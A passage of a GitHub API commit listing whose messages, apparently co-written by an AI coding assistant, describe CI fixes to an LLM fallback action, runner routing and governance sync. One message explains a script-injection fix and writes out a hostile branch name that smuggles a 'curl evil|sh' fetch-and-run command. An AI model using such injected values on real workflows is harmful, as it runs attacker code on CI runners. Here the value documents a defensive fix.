DOUBLE-quoted, so the sequence closed the quote, emitted a literal `\"`, and\n   left the rest of the line opening a string that never closed. The step died on\n   a bash syntax error.\n\n   The failure mode is the interesting part: `code=3` was written to\n   $GITHUB_OUTPUT before the malformed line, so the Finish step read the right\n   value, printed \"conclusion=neutral mode=declined\" and exited 0 — while the\n   classify step''s own non-zero failed the composite. Every log line said the\n   chain resolved correctly and the job was red anyway. Confirmed against the\n   FuzeX mcp-maintain run: step 5 \"Run mcp-maintainer\" failed with `CLAUDE_CODE:\n   3` and no ::error:: anywhere in the log.\n\n2. NOTHING RAN THE TESTS. Four test files ship beside this action — the classify\n   decision table, the 96-combination rung-gating sweep, the passthrough-default\n   check, the extra-env check — and `grep -rn fuze-code-action/__tests__\n   .github/workflows/` returned nothing, in every repo. They were green on a\n   developer''s machine and never once executed by CI, so they could not fail a\n   PR and protected nothing. That is the same vacuous shape as a gate that exits\n   0 without looking, and it is why a shell-quoting bug reached 18 branches.\n\n   New `.github/workflows/gate-fuze-code-action.yml` runs all five on any PR\n   touching `.github/actions/fuze-code-action/**` or `llm-endpoint/**`.\n\nNew `__tests__/test_run_blocks_parse.py` extracts every `run:` block from both\nactions, substitutes `${{ }}` (the runner does that before bash sees it), and\n`bash -n` parses each one. Not a correctness check and not claimed to be — it\ncatches exactly this class: unterminated strings, unbalanced heredocs, unclosed\n`if`/`for`/`case`. Verified by mutation: reintroducing the shipped `''\"''\"''`\nsequence fails it with \"unexpected EOF while looking for matching `\"''\".\n\n* fix(ci): stranded on ubuntu-latest — the preflight red was never about credentials\n\nI called the a2a/mcp-maintain preflight failures a missing-credential problem and\nsaid the fix was minting secrets. That was wrong, and the evidence corrects it\ncleanly.\n\nFuzeDeploy run 32778573184, two jobs, same workflow:\n\n    mcp-maintain preflight  labels: [\"ubuntu-latest\"]  failure  3s  no runner id, no log\n    mcp-maintain            labels: [\"fuzedeploy\"]     skipped        (needs: preflight)\n\nA job that fails in three seconds with no runner assigned and no downloadable log\ndid not run and fail — it NEVER STARTED. On a private repo whose Actions budget is\nexhausted, a GitHub-hosted job is simply refused. The correlation is exact: the 13\nrepos that declare `ci.runner` are precisely the ones where every `ubuntu-latest`\njob dies this way, and the 4 that declare none (FuzeFront, FuzeKeys, FuzeX,\nFuzeAgent) are precisely the ones where preflight passes. Credentials never came\ninto it.\n\nThe trap is already documented in this repo — reusable-claude-ci-autofix.yml spells\nit out verbatim — and I read that comment this afternoon and then hard-coded\n`ubuntu-latest` in a brand-new workflow anyway.\n\nThree changes:\n\n  - a2a-maintain.yml / mcp-maintain.yml preflight -> the repo''s ci.runner. The\n    installer had rewritten the MAINTAINER job to the scale set and left the\n    preflight behind, so `needs: preflight` killed the whole workflow. a2a/mcp\n    maintenance has been dead in these repos and has been reading as a\n    credential gap the whole time.\n  - gate-fuze-code-action.yml -> the repo''s ci.runner (ubuntu-latest only where\n    no runner is declared).\n  - actions/setup-python pinned to a26af69be951a213d495a4c3e4e4022e16d87065 (v5)\n    instead of the mutable @v5 tag — flagged by Semgrep''s\n    github-actions-mutable-action-tag on FuzeKeys#109, and the SHA already in use\n    by harden-gate.yml in these same repos.\n\n* fix(gate-manifest): reconcile the vendored schema — it rejected a key the canonical allows\n\ngate-manifest failed on FuzeMerchandize#34 and FuzeFinance#35:\n\n    gate-manifest: 1 violation(s)\n      ✗ ci — Additional properties are not allowed (''note'' was unexpected)\n\nThe manifests are not wrong. FuzeSDLC''s canonical governance/repo-manifest.schema.json\ndeclares `note` on the `ci` block with a description; the VENDORED\n.fuze/repo-manifest.schema.json in these repos predates that and still sets\n`additionalProperties: false` without it. A stale MANAGED file, rejecting a field the\nsource of truth explicitly permits.\n\nReconciled from the canonical. Verified before writing: all 17 repos'' manifests\nvalidate cleanly against the canonical schema under jsonschema Draft 2020-12, so this\nturns two reds green and introduces none.\n\nScope note — measured, not assumed:\n  * 6 repos define the gate-manifest job AND ship scripts/gate_manifest.py; those are\n    the copies reconciled here.\n  * 11 repos have NEITHER the job nor the script. Consistent, so nothing is passing\n    vacuously there, and their stale schema is inert. Left alone rather than adding\n    unrelated churn to a CI-routing PR — it is rollout backlog, not a defect.\n  * FuzeHub has no vendored schema at all.\n\nThe drift itself is worth naming: every vendored copy differs from the canonical, and\nthis one only surfaced because the runner fix let the job actually execute. A MANAGED\nfile that nothing reconciles is a latent version of exactly this failure.\n\n* chore(governance): reconcile managed files to FuzeSDLC v1 [skip ci]\n\n* fix(governance-sync): a 403 is not a race — and FuzeHub could never push at all\n\nThe rebase-and-retry loop I added earlier had a real defect, and FuzeHub exposed it\nwithin the hour. From its job log:\n\n    remote: Write access to repository not granted.\n    fatal: ... The requested URL returned error: 403\n    ::notice::push rejected (attempt 1/3) — the branch moved under us; rebasing...\n    Current branch chore/fuze-code-action is up to date.\n\nThe loop retried a PERMISSION failure three times while announcing \"the branch moved\nunder us\" — with git''s own next line flatly contradicting it. A diagnostic that names\nthe wrong cause is worse than no diagnostic: it sends the reader looking for a race\nthat never happened.\n\nNow the loop reads the push output and separates the two. A 403 / \"Write access not\ngranted\" / \"Permission denied\" fails IMMEDIATELY with a message naming the actual\ncause and where to look. Only a genuine rejection is retried.\n\nAnd the underlying FuzeHub finding, which is the more serious half:\n\n  permissions:\n    contents: read  # read-only; commit-back uses the SSH deploy key via git\n                    # remote reconfiguration\n\nThere is no such reconfiguration in that file. The one `ssh-key:` present is on the\ncheckout of the FuzeSDLC canonical into .fuzesdlc-canonical — a READ of another repo,\nnot the push remote for this one. So the comment described a mechanism that does not\nexist, and the push could never succeed. Every run computed a reconciliation and threw\nit away.\n\nThat was invisible for as long as the old `|| echo \"::warning::commit-back push failed\n(token may be read-only)\"` stood: a push failure could not fail anything, so FuzeHub''s\ngovernance reconciliation has silently not been landing. Removing the soft-fail is what\nsurfaced it, which was the stated reason for removing it.\n\nSet to `contents: write`, matching the canonical, and the false comment replaced with\nthe record of what actually happened.\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>\nCo-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>","tree":{"sha":"5127a7c76279160269cfa67473e8c035f020ef33","url":"https://api.github.com/repos/izzywdev/FuzeX/git/trees/5127a7c76279160269cfa67473e8c035f020ef33"},"url":"https://api.github.com/repos/izzywdev/FuzeX/git/commits/c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05","verification":{"payload":"tree 5127a7c76279160269cfa67473e8c035f020ef33\nparent 3d4193d9ea656b1e5fc0c1c8820e0e991fd498df\nauthor Israel Weinberg <99821070+izzywdev@users.noreply.github.com> 1787610625 +0300\ncommitter GitHub <noreply@github.com> 1787610625 +0300\n\nrefactor(ci): route claude-code-action call sites through fuze-code-action (#48)\n\n* refactor(ci): route claude-code-action call sites through fuze-code-action\n\nReplaces every `anthropics/claude-code-action@<sha>` call site in this repo with\nthe vendored `./.github/actions/fuze-code-action` wrapper, collapsing the fleet''s\npin drift (8 distinct refs for one action, including a MUTABLE `v1` tag) to a\nsingle pin inside the action.\n\nThe wrapper tries providers in order and falls through ONLY on an AVAILABILITY\nfailure — credit/quota exhausted, auth failure, rate limit, 5xx, or the provider\ncould not start. NEVER on a task failure. Retrying a genuine review finding or a\nreal build break against a second vendor would convert an honest red into a\ngreen, which is the defect this exists to remove, not introduce.\n\nVendored rather than referenced cross-repo because the action does\n`uses: ./.github/actions/llm-endpoint`, and a relative path inside a composite\naction consumed from another repository is exactly what breaks. llm-endpoint is\nvendored alongside it for the same reason.\n\nMENTION MODE: `claude.yml` passes no prompt — claude-code-action derives the task\nfrom the triggering GitHub event. codex-action and run-gemini-cli have no GitHub\nevent context at all, so with an empty prompt they cannot see the task; a rung\nthat \"succeeded\" there would report success for work nobody performed. The\nwrapper therefore DISABLES the fallover chain when no task-prompt is given, says\nso in a ::warning:: rather than skipping silently, and fails if rung 1 fails.\n\nVerified, not assumed: a checker parses this repo''s workflows BEFORE and AFTER as\nYAML and asserts every original `with:` input and every `env:` var is still\ncarried, under its mapped name or via the action''s extra-env passthrough. Zero\nlosses. The action ships 37 of its own tests (27 classify + 3 rung-gating +\n7 extra-env), all passing.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n* test(fuze-code-action): replace the gate evaluator''s eval() with a real parser\n\nSemgrep flagged python.lang.security.audit.eval-detected on the mini\nexpression evaluator in test_rung_gating.py, and it was right to: the helper\nstring-substituted context values into the `if:` text and handed the result to\neval(), so any GitHub expression syntax it did not recognise was silently\nreinterpreted under Python''s operator rules rather than rejected.\n\nReplaced with a tokenizer + recursive-descent parser over the exact subset the\naction''s gates use (&&, ||, !, ==, !=, parentheses, string literals, context\nlookups, always()). This is stricter, not merely safer: unsupported syntax and\ncontext keys the test never supplied now raise GateSyntaxError instead of\nevaluating, so an `if:` the harness cannot parse is reported as an UNCHECKED\ngate rather than silently counted as False.\n\nAdded TestEvaluator covering comparisons, && binding tighter than ||,\nparenthesised grouping, bare-operand truthiness, and that each unsupported form\nraises — the evaluator is what the invariants are measured with, so a permissive\none would pass every assertion while proving nothing about the real gates.\n\nVendored from FuzeSDLC (feat/fuze-code-action). Suppressing the finding was not\nan option: a nosemgrep comment leaves the weaker evaluator in place.\n\n* ci: clear the actionlint findings the migration brought into scope\n\nactionlint only lints workflow files a PR changes, so routing every\nclaude-code-action call site through fuze-code-action pulled several\nlong-standing findings into scope. They are real; fixing them is the job.\n\nnightly-integration.yml — two shellcheck findings (SC2129 on consecutive\n$GITHUB_ENV redirects, SC2086 on an unquoted $envf). The vendored copy was\nSTALE: FuzeSDLC''s canonical template already carries both fixes, so this\nreconciles to it byte-for-byte rather than inventing a third form. The\n`envf` fix is substantive, not style — an array keeps `--env-file <path>`\ntwo words while surviving a path containing a space.\n\nclaude.yml (fuzemerchandize, fuzeplan, fuzeservice) — script injection.\n`github.event.pull_request.head.ref` was interpolated into an inline `run:`\nwith ${{ }}, which substitutes into the shell SOURCE before bash parses it.\nA fork branch named `x\";curl evil|sh;\"` executes on the runner. Moved that\nand every sibling context read to `env:` so they arrive as data.\n\nclaude-autofix-post-prod.yml (FuzeFront) — SC2129 on three consecutive\n$GITHUB_OUTPUT redirects.\n\nVerified with actionlint 1.7.12 (the CI-pinned version) over every changed\nworkflow file in all 17 repos: clean.\n\n* fix(fuze-code-action): rung 2 had never once executed — empty passthrough killed it\n\n`codex-safety-strategy` defaulted to '''' and was forwarded verbatim as\ncodex-action''s `safety-strategy`. An empty `with:` value OVERRIDES the callee''s\nown `default:` rather than falling back to it, and codex-action declares that\ninput `default: ''drop-sudo''` and rejects an empty one outright. Every\ninvocation therefore died in codex-action''s `resolve-codex-home` step with\n\"Invalid safety strategy: .\" before Codex ran. Rung 2 — the entire reason this\naction exists — had never executed. The chain then correctly reported itself\nexhausted and failed, so the symptom looked like \"no vendor available\" rather\nthan \"the fallover is broken\".\n\n  - codex-safety-strategy: '''' -> ''drop-sudo'' (codex-action''s own default).\n  - codex-sandbox: ''read-only'' -> ''workspace-write''. Rung 2 is the fallover for\n    work rung 1 would have COMMITTED (the a2a/mcp maintainers edit and push). A\n    read-only Codex runs to completion having changed nothing and reports\n    success — a vacuous green, which is what this action exists to prevent.\n\nNew __tests__/test_passthrough_defaults.py generalises the rule: for every input\nforwarded to a third-party action, if the CALLEE declares a non-empty default,\nthis action''s own default must be non-empty or the step must be gated on\n`inputs.X != ''''`. The callee tables are recorded from the exact pinned SHAs and\nare offline on purpose; an unrecorded `uses:` fails, so a pin bump forces\nre-reading that action''s inputs instead of carrying a stale table forward.\n\nVerified by mutation: restoring `default: ''''` fails 2 assertions, and bumping\nthe codex pin fails the pin-recorded test. Run-gemini-cli''s `prompt` has the\nsame shape (callee default \"You are a helpful assistant.\") and passes only\nbecause rung 3 is gated on `inputs.task-prompt != ''''` — the test recognises\nthat gate rather than special-casing it.\n\n* fix(llm-endpoint): the docker failure diagnostic was unreachable, and a one-vendor chain needs no container\n\nSymptom: `mcp-maintain` / `a2a-maintain` failing with a bare \"Process completed\nwith exit code 125\" from the resolve step, no error title, no docker log — so\nrung 1 never started and the whole fallover chain reported itself exhausted.\nOnly the four repos carrying the multi-vendor llm-endpoint were affected; the\nrepos still on the single-vendor version route direct to Anthropic and were fine.\n\nThree fixes, in order of what they cost:\n\n1. THE DIAGNOSTIC WAS UNREACHABLE. `docker run ...; run_rc=$?` cannot work: the\n   runner invokes `shell: bash` steps with `-e` already on, and `set -uo pipefail`\n   at the top of the script does not turn it off, so a failing `docker run` aborts\n   the step before `run_rc` is ever assigned. The `if [ $run_rc -ne 0 ]` branch —\n   which prints the error title AND docker-run.log — was dead code from the day it\n   was written. Rewritten as `if docker run ...; then rc=0; else rc=$?; fi`, a\n   tested context, the one place errexit is defined not to apply. This is the same\n   trap the classify step already documents; it was not applied here.\n\n2. A SINGLE-VENDOR CHAIN NOW ROUTES DIRECT. When only anthropic has a key — the\n   actual configuration in all four repos — the old path still started a\n   runner-local LiteLLM whose model_list had one entry and whose router_settings\n   had no `fallbacks:`. That buys nothing a direct api.anthropic.com call does not,\n   and adds a docker dependency the runner may not satisfy. openai/gemini still go\n   through LiteLLM, since it is what translates them into the Anthropic shape\n   claude-code-action speaks.\n\n3. A CONTAINER THAT WILL NOT START DEGRADES INSTEAD OF KILLING THE CHAIN. If\n   anthropic is in the available chain, fall back to the direct leg — the path this\n   action used before the multi-vendor chain existed. This is a real working path,\n   not a mask: the `::warning::` states exactly what was lost (no automatic advance\n   past anthropic on a quota/auth error), so a degraded run stays distinguishable\n   from a good one. With no anthropic key there is no Anthropic-shape endpoint at\n   all, and it still fails closed.\n\nVerified by running the extracted script against stubbed docker/curl:\nanthropic-only exits 0 without invoking docker; anthropic+openai with docker\nfailing exits 0 on the degraded leg and emits the warning; openai-only with docker\nfailing exits 1 and prints the fail-closed error.\n\n* ci(claude): wire openai + gemini keys — two of three rungs were unreachable\n\n`claude.yml` passed only `anthropic-api-key` (and `litellm-key`) to\nfuze-code-action. Rungs 2 and 3 are gated on `inputs.openai-api-key != ''''` and\n`inputs.gemini-api-key != ''''`, so with those inputs absent the action reported\n\"structurally supported, skipped — no key\" and fell straight to an exhausted\nchain. A fallover chain that advertises three vendors and can only ever reach\none is the same shape of defect as a gate that passes without looking.\n\nThe secrets already exist at the org/repo level; only the wiring was missing.\nNothing here changes behaviour where a secret is genuinely unset — the rung\nstill skips with its notice, and the chain still fails closed.\n\n* fix(fuze-code-action): \"the rung declined to run\" is not a failure — third verdict\n\nRoot cause of the a2a-maintain / mcp-maintain reds on every migration PR, from\nthe job log:\n\n  Skipping action due to workflow validation: the workflow file must exist and\n  have identical content to the version on the repository''s default branch.\n\nclaude-code-action refuses to run when the pull request modifies the workflow\nfile that invokes it — which every workflow-migration PR does by construction.\nIt exits 0 and reports NO conclusion. classify.sh read an empty conclusion as\n\"action-could-not-start\", classified it availability, fell through to rungs 2\nand 3, found no keys, and failed the job.\n\nBoth halves of that were wrong. Falling through runs the other vendors on\nexactly the task the guard exists to prevent. Failing reports a break that did\nnot happen — nothing is wrong with the repo, the action, or the credentials.\n\nSo: exit code 3, `declined`. Does not fall through, does not fail. The Finish\nstep exits 0 with mode=declined and conclusion=neutral, and BOTH the rung notice\nand the finish warning state plainly that no work was performed and that\nwhatever this workflow maintains was NOT checked on this commit. A neutral run\nstays distinguishable from a run that did the job — it is not being quietly\nrecoloured green.\n\nThe distinction is keyed on the RUNNER''s own outcome for the step, threaded in\nas classify.sh''s new third argument. A rung that genuinely could not start\nreports outcome=failure (or none) and still classifies as availability and still\nfalls through; only a step the runner says SUCCEEDED can decline.\n\nTests: test_classify.sh 27 -> 34 cases, including the four that pin the\ndistinction (succeeded -> declined; failed / skipped / absent -> availability)\nand two that prove a real conclusion is never reclassified by the new argument.\ntest_rung_gating.py sweeps code \"3\" too — 72 -> 96 combinations — asserting a\ndecline never reaches rungs 2 or 3.\n\nVerified by mutation in both directions: deleting the branch fails 2 cases,\nand widening it to ignore the step outcome fails 4.\n\n* fix(governance-sync): rebase and retry — a branch that moved is not a governance failure\n\ngovernance-sync commits its reconciliation onto a LIVE PR branch, then pushed\nwith a bare `git push`. Any push the PR author makes between this job''s checkout\nand its push wins the race, and the push is rejected with\n\n    ! [rejected]  HEAD -> <branch> (fetch first)\n\nwhich failed the job. That turned an ordinary race into a red check saying\nnothing about governance. It happened three times in one afternoon during a\nfleet-wide migration; FuzeSales#64 is the recorded instance.\n\nNow: on rejection, rebase onto the branch that moved and retry, up to three\ntimes. Deliberately NOT `|| true` — if the push still cannot land, or the rebase\nconflicts, it errors and fails with a message naming the remedy. A push that\ngenuinely cannot happen is a real failure and must stay one.\n\nFuzeHub carried an older variant that ended in\n`|| echo \"::warning::commit-back push failed (token may be read-only)\"`, i.e. a\npush failure could never red anything. That is the same vacuous shape from the\nopposite side, so it is reconciled to the canonical form with the rest. If its\ntoken really is read-only, this will now surface it instead of muffling it —\nwhich is the point.\n\n* fix(fuze-code-action): unterminated quote broke classify, and NOTHING ran the tests\n\nTwo defects, and the second is why the first shipped.\n\n1. The `::warning::` I added to the rung-1 classify step wrote an apostrophe with\n   the `''\"''\"''` idiom. That is correct inside SINGLE quotes; the string was\n   DOUBLE-quoted, so the sequence closed the quote, emitted a literal `\"`, and\n   left the rest of the line opening a string that never closed. The step died on\n   a bash syntax error.\n\n   The failure mode is the interesting part: `code=3` was written to\n   $GITHUB_OUTPUT before the malformed line, so the Finish step read the right\n   value, printed \"conclusion=neutral mode=declined\" and exited 0 — while the\n   classify step''s own non-zero failed the composite. Every log line said the\n   chain resolved correctly and the job was red anyway. Confirmed against the\n   FuzeX mcp-maintain run: step 5 \"Run mcp-maintainer\" failed with `CLAUDE_CODE:\n   3` and no ::error:: anywhere in the log.\n\n2. NOTHING RAN THE TESTS. Four test files ship beside this action — the classify\n   decision table, the 96-combination rung-gating sweep, the passthrough-default\n   check, the extra-env check — and `grep -rn fuze-code-action/__tests__\n   .github/workflows/` returned nothing, in every repo. They were green on a\n   developer''s machine and never once executed by CI, so they could not fail a\n   PR and protected nothing. That is the same vacuous shape as a gate that exits\n   0 without looking, and it is why a shell-quoting bug reached 18 branches.\n\n   New `.github/workflows/gate-fuze-code-action.yml` runs all five on any PR\n   touching `.github/actions/fuze-code-action/**` or `llm-endpoint/**`.\n\nNew `__tests__/test_run_blocks_parse.py` extracts every `run:` block from both\nactions, substitutes `${{ }}` (the runner does that before bash sees it), and\n`bash -n` parses each one. Not a correctness check and not claimed to be — it\ncatches exactly this class: unterminated strings, unbalanced heredocs, unclosed\n`if`/`for`/`case`. Verified by mutation: reintroducing the shipped `''\"''\"''`\nsequence fails it with \"unexpected EOF while looking for matching `\"''\".\n\n* fix(ci): stranded on ubuntu-latest — the preflight red was never about credentials\n\nI called the a2a/mcp-maintain preflight failures a missing-credential problem and\nsaid the fix was minting secrets. That was wrong, and the evidence corrects it\ncleanly.\n\nFuzeDeploy run 32778573184, two jobs, same workflow:\n\n    mcp-maintain preflight  labels: [\"ubuntu-latest\"]  failure  3s  no runner id, no log\n    mcp-maintain            labels: [\"fuzedeploy\"]     skipped        (needs: preflight)\n\nA job that fails in three seconds with no runner assigned and no downloadable log\ndid not run and fail — it NEVER STARTED. On a private repo whose Actions budget is\nexhausted, a GitHub-hosted job is simply refused. The correlation is exact: the 13\nrepos that declare `ci.runner` are precisely the ones where every `ubuntu-latest`\njob dies this way, and the 4 that declare none (FuzeFront, FuzeKeys, FuzeX,\nFuzeAgent) are precisely the ones where preflight passes. Credentials never came\ninto it.\n\nThe trap is already documented in this repo — reusable-claude-ci-autofix.yml spells\nit out verbatim — and I read that comment this afternoon and then hard-coded\n`ubuntu-latest` in a brand-new workflow anyway.\n\nThree changes:\n\n  - a2a-maintain.yml / mcp-maintain.yml preflight -> the repo''s ci.runner. The\n    installer had rewritten the MAINTAINER job to the scale set and left the\n    preflight behind, so `needs: preflight` killed the whole workflow. a2a/mcp\n    maintenance has been dead in these repos and has been reading as a\n    credential gap the whole time.\n  - gate-fuze-code-action.yml -> the repo''s ci.runner (ubuntu-latest only where\n    no runner is declared).\n  - actions/setup-python pinned to a26af69be951a213d495a4c3e4e4022e16d87065 (v5)\n    instead of the mutable @v5 tag — flagged by Semgrep''s\n    github-actions-mutable-action-tag on FuzeKeys#109, and the SHA already in use\n    by harden-gate.yml in these same repos.\n\n* fix(gate-manifest): reconcile the vendored schema — it rejected a key the canonical allows\n\ngate-manifest failed on FuzeMerchandize#34 and FuzeFinance#35:\n\n    gate-manifest: 1 violation(s)\n      ✗ ci — Additional properties are not allowed (''note'' was unexpected)\n\nThe manifests are not wrong. FuzeSDLC''s canonical governance/repo-manifest.schema.json\ndeclares `note` on the `ci` block with a description; the VENDORED\n.fuze/repo-manifest.schema.json in these repos predates that and still sets\n`additionalProperties: false` without it. A stale MANAGED file, rejecting a field the\nsource of truth explicitly permits.\n\nReconciled from the canonical. Verified before writing: all 17 repos'' manifests\nvalidate cleanly against the canonical schema under jsonschema Draft 2020-12, so this\nturns two reds green and introduces none.\n\nScope note — measured, not assumed:\n  * 6 repos define the gate-manifest job AND ship scripts/gate_manifest.py; those are\n    the copies reconciled here.\n  * 11 repos have NEITHER the job nor the script. Consistent, so nothing is passing\n    vacuously there, and their stale schema is inert. Left alone rather than adding\n    unrelated churn to a CI-routing PR — it is rollout backlog, not a defect.\n  * FuzeHub has no vendored schema at all.\n\nThe drift itself is worth naming: every vendored copy differs from the canonical, and\nthis one only surfaced because the runner fix let the job actually execute. A MANAGED\nfile that nothing reconciles is a latent version of exactly this failure.\n\n* chore(governance): reconcile managed files to FuzeSDLC v1 [skip ci]\n\n* fix(governance-sync): a 403 is not a race — and FuzeHub could never push at all\n\nThe rebase-and-retry loop I added earlier had a real defect, and FuzeHub exposed it\nwithin the hour. From its job log:\n\n    remote: Write access to repository not granted.\n    fatal: ... The requested URL returned error: 403\n    ::notice::push rejected (attempt 1/3) — the branch moved under us; rebasing...\n    Current branch chore/fuze-code-action is up to date.\n\nThe loop retried a PERMISSION failure three times while announcing \"the branch moved\nunder us\" — with git''s own next line flatly contradicting it. A diagnostic that names\nthe wrong cause is worse than no diagnostic: it sends the reader looking for a race\nthat never happened.\n\nNow the loop reads the push output and separates the two. A 403 / \"Write access not\ngranted\" / \"Permission denied\" fails IMMEDIATELY with a message naming the actual\ncause and where to look. Only a genuine rejection is retried.\n\nAnd the underlying FuzeHub finding, which is the more serious half:\n\n  permissions:\n    contents: read  # read-only; commit-back uses the SSH deploy key via git\n                    # remote reconfiguration\n\nThere is no such reconfiguration in that file. The one `ssh-key:` present is on the\ncheckout of the FuzeSDLC canonical into .fuzesdlc-canonical — a READ of another repo,\nnot the push remote for this one. So the comment described a mechanism that does not\nexist, and the push could never succeed. Every run computed a reconciliation and threw\nit away.\n\nThat was invisible for as long as the old `|| echo \"::warning::commit-back push failed\n(token may be read-only)\"` stood: a push failure could not fail anything, so FuzeHub''s\ngovernance reconciliation has silently not been landing. Removing the soft-fail is what\nsurfaced it, which was the stated reason for removing it.\n\nSet to `contents: write`, matching the canonical, and the false comment replaced with\nthe record of what actually happened.\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>\nCo-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqjMYBCRC1aQ7uu5UhlAAAh3wQAF5MV0JkY9OnM8DjU6czqpkX\n42R3PY9zU9FEnnEksNHPsSrhYzBvsgd/l70qqgAWH5MM/bK9Ur4Uk8RoRBn7PkV1\nD+uKVeIspfISPOeJUbcEN/vZyolGXgpDHgSiGYdOXwrJVdFvFqEgjV4mzmyY5YWo\n1PFZKYvS8UP/iEu2KxSpf8a2M6QcgqoQwRTOU0hRsdKquSDBbpKPWCTuGVB4pFKw\n3oEWi73eWE6xegb5WZ2lNaU3H9wSY2QejLEks4gHZchvo80zltpT2+aCMPwgzppn\ncv4y5A0cXc/rTkKwqgn55gdbGowT3FFxd60LBdah9oWdQR0uvEUpBiRx0I0VSE1x\nW/avGn+7N29z0x/GUerBm6u3Dsaq7UuKpgVyyPGiIQGaWJgAeYYw4mNH798KINDu\nepgN7BIR85vn5PaZUEESAfz6YO7rUubuWwfDfhfmSsnFqBx61FtoRZGizcJAtGrR\nLmxIm4isLqflp3QNxwH7l0CVbVvbmq4taNPm8LTO+UuEwg+EbwnokXKCM0D2+vN+\nAMVjSLv/ukuT673Q+uTRc2GkFXLheyEi45c5YQxYhIVmYRfGrNXmbhVezrCD82x7\nIuEcSS0UwGuwjRYGgmHzXihDDfLKSoP3fLCjQeAgkKiVNyP3T4zkv2pcj1cxV/gE\nIWApyinM5nfrKdHN1MIq\n=MyAh\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-24T22:30:25Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeX/commit/c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05","node_id":"C_kwDOO8VI2toAKGMzODEwNzYxZmE5YjJmOTJmNTQ2MmNlMGVkMDRlMmUzYWU0N2FiMDU","parents":[{"html_url":"https://github.com/izzywdev/FuzeX/commit/3d4193d9ea656b1e5fc0c1c8820e0e991fd498df","sha":"3d4193d9ea656b1e5fc0c1c8820e0e991fd498df","url":"https://api.github.com/repos/izzywdev/FuzeX/commits/3d4193d9ea656b1e5fc0c1c8820e0e991fd498df"}],"sha":"c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05","url":"https://api.github.com/repos/izzywdev/FuzeX/commits/c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/in/1236702?v=4","events_url":"https://api.github.com/users/claude%5Bbot%5D/events{/privacy}","followers_url":"https://api.github.com/users/claude%5Bbot%5D/followers","following_url":"https://api.github.com/users/claude%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/claude%5Bbot%5D/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/apps/claude","id":209825114,"login":"claude[bot]","node_id":"BOT_kgDODIGtWg","organizations_url":"https://api.github.com/users/claude%5Bbot%5D/orgs","received_events_url":"https://api.github.com/users/claude%5Bbot%5D/received_events","repos_url":"https://api.github.com/users/claude%5Bbot%5D/repos","site_admin":false,"starred_url":"https://api.github.com/users/claude%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/claude%5Bbot%5D/subscriptions","type":"Bot","url":"https://api.github.com/users/claude%5Bbot%5D","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeX/commits/3d4193d9ea656b1e5fc0c1c8820e0e991fd498df/comments","commit":{"author":{"date":"2026-08-23T11:03:04Z","email":"209825114+claude[bot]@users.noreply.github.com","name":"claude[bot]"},"comment_count":0,"committer":{"date":"2026-08-23T11:03:04Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(ci): adopt the proven multi-vendor llm-endpoint fallback chain (#47)\n\na2a-maintain/mcp-maintain preflight hard-fails with \"LITELLM_FUZE_KEY is not\nset\" whenever the manifest declares a2a.enabled/mcp.enabled and only that one\nLiteLLM virtual key secret is configured — the old pre-fallback-chain contract.\nFuzeFront#782 fixed this with a real LiteLLM -> anthropic|openai|gemini fallback\nchain (a runner-local LiteLLM proxy that walks configured vendors on\nquota/rate-limit/auth errors, not just transport failure); proven working:\nFuzeFront#783/#784/#786 went red -> green once #782 merged.\n\nVendor that composite action (.github/actions/llm-endpoint) and re-stamp a2a-maintain.yml mcp-maintain.yml\nto the same pattern here, so this repo''s declared A2A/MCP surface can be\nmaintained off LITELLM_FUZE_KEY OR any configured provider key, and both the\npreflight AND each maintainer job''s own credential resolution route through the\nsame chain (not preflight alone).\n\nCo-authored-by: Claude <noreply@anthropic.com>","tree":{"sha":"a1f984e3ebd85180a80bb1c5da36057786cc20f3","url":"https://api.github.com/repos/izzywdev/FuzeX/git/trees/a1f984e3ebd85180a80bb1c5da36057786cc20f3"},"url":"https://api.github.com/repos/izzywdev/FuzeX/git/commits/3d4193d9ea656b1e5fc0c1c8820e0e991fd498df","verification":{"payload":"tree a1f984e3ebd85180a80bb1c5da36057786cc20f3\nparent 4a0212dcf89112be1a150cec39da9f1cb5ccb0fc\nauthor claude[bot] <209825114+claude[bot]@users.noreply.github.com> 1787482984 +0300\ncommitter GitHub <noreply@github.com> 1787482984 +0300\n\nfix(ci): adopt the proven multi-vendor llm-endpoint fallback chain (#47)\n\na2a-maintain/mcp-maintain preflight hard-fails with \"LITELLM_FUZE_KEY is not\nset\" whenever the manifest declares a2a.enabled/mcp.enabled and only that one\nLiteLLM virtual key secret is configured — the old pre-fallback-chain contract.\nFuzeFront#782 fixed this with a real LiteLLM -> anthropic|openai|gemini fallback\nchain (a runner-local LiteLLM proxy that walks configured vendors on\nquota/rate-limit/auth errors, not just transport failure); proven 